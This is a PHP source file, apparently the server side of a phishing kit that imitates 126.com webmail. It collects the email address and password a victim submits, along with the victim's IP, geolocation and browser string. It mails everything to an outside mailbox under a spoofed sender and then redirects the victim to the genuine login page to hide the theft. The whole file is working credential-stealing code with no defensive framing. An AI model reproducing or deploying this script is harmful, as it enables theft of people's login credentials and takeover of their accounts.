<?php
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//locate the IP
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$data .= "Email Address : ".$_POST['user']."\n";
$data .= "Password : ".$_POST['pass']."\n";
$data .= "------------------------------------------\n";
$data .= 	"IP: {$geoplugin->ip}\n";
$data .= 	"City: {$geoplugin->city}\n";
$data .= 	"Region: {$geoplugin->region}\n";
$data .= 	"Country Name: {$geoplugin->countryName}\n";
$data .= 	"Country Code: {$geoplugin->countryCode}\n";
$data .= 	"User-Agent: ".$browser."\n";
$data.= "Login Date  : ".$date."\n";
$data.= "Login Time  : ".$time."\n";
$data .= "--------------------------------------\n";
$data .= "Pow3r3D bY LEE CHON HOI\n";
$data .= "--------------------------------------\n";
$from = "From: 126.com<secure@sendmsexcel.com>";
$subject = "126 MM Webmail 2020 :".$ip;
mail("leechonhoi@yandex.com",$subject,$data,$from);

header("Location: https://mail.126.com/");

?>